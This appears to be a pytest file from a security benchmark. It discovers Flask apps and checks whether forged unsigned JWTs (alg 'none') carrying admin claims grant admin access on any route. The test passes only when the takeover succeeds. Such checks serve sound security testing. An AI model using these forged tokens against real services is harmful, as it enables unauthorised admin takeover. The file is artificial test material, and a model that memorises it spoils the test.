import base64
import importlib
import json
import os

def _b64(o):
    b = json.dumps(o, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

def _try_import(n):
    try:
        return importlib.import_module(n)
    except Exception:
        return None

def _collect_mods():
    mods = []
    for n in ["app", "main", "server", "api", "web", "demo", "application", "auth"]:
        m = _try_import(n)
        if m is not None:
            mods.append(m)
    try:
        entries = os.listdir(".")
    except Exception:
        entries = []
    for e in entries:
        if e.endswith(".py"):
            n = e[:-3]
            if n.startswith("test_"):
                continue
            m = _try_import(n)
            if m is not None and m not in mods:
                mods.append(m)
        else:
            try:
                isdir = os.path.isdir(e)
            except Exception:
                isdir = False
            if isdir:
                try:
                    inner = os.listdir(e)
                except Exception:
                    inner = []
                if "__init__.py" in inner:
                    m = _try_import(e)
                    if m is not None and m not in mods:
                        mods.append(m)
    return mods

def _apps_from_mod(mod):
    out = []
    for attr in ["app", "application", "flask_app", "server"]:
        try:
            has = hasattr(mod, attr)
        except Exception:
            has = False
        if has:
            v = getattr(mod, attr)
            if hasattr(v, "test_client") and hasattr(v, "url_map"):
                if v not in out:
                    out.append(v)
    try:
        has_factory = hasattr(mod, "create_app")
    except Exception:
        has_factory = False
    if has_factory:
        try:
            v = mod.create_app()
            if hasattr(v, "test_client"):
                if v not in out:
                    out.append(v)
        except Exception:
            pass
    try:
        vals = list(vars(mod).values())
    except Exception:
        vals = []
    for v in vals:
        try:
            ok = hasattr(v, "test_client") and hasattr(v, "url_map")
        except Exception:
            ok = False
        if ok and v not in out:
            out.append(v)
    return out

def _concrete(p):
    r = ""
    skip = False
    for ch in p:
        if ch == "<":
            skip = True
            r = r + "1"
        elif ch == ">":
            skip = False
        elif not skip:
            r = r + ch
    return r

def _routes(app):
    paths = []
    try:
        rules = list(app.url_map.iter_rules())
    except Exception:
        rules = []
    for rule in rules:
        try:
            s = str(rule)
        except Exception:
            continue
        if "static" in s:
            continue
        paths.append(s)
    for c in ["/", "/me", "/profile", "/admin", "/api/me", "/session", "/whoami", "/user"]:
        if c not in paths:
            paths.append(c)
    return paths[:25]

def _is_admin(resp):
    try:
        code = resp.status_code
    except Exception:
        return False
    if code != 200:
        return False
    try:
        data = resp.data
    except Exception:
        return False
    try:
        txt = data.decode(errors="ignore").lower()
    except Exception:
        return False
    if "admin" not in txt:
        return False
    return True

def _tokens():
    hb = _b64({"alg": "none", "typ": "JWT"})
    payloads = [
        {"admin": True},
        {"is_admin": True},
        {"role": "admin"},
        {"username": "admin"},
        {"sub": "admin"},
        {"user": "admin"},
        {"admin": True, "sub": "admin"},
        {"role": "admin", "sub": "admin"},
    ]
    toks = []
    for p in payloads:
        pb = _b64(p)
        toks.append(hb + "." + pb + ".")
        toks.append(hb + "." + pb)
    return toks

def test_unsigned_admin_takeover():
    mods = _collect_mods()
    apps = []
    for m in mods:
        for a in _apps_from_mod(m):
            if a not in apps:
                apps.append(a)
    assert len(apps) > 0
    toks = _tokens()
    for app in apps:
        try:
            paths = _routes(app)
        except Exception:
            continue
        try:
            client = app.test_client()
        except Exception:
            continue
        for path in paths:
            cpath = _concrete(path)
            try:
                base = client.get(cpath)
            except Exception:
                continue
            if _is_admin(base):
                continue
            for tok in toks:
                try:
                    r = client.get(cpath, headers={"Authorization": "Bearer " + tok})
                except Exception:
                    continue
                if _is_admin(r):
                    return
    assert False

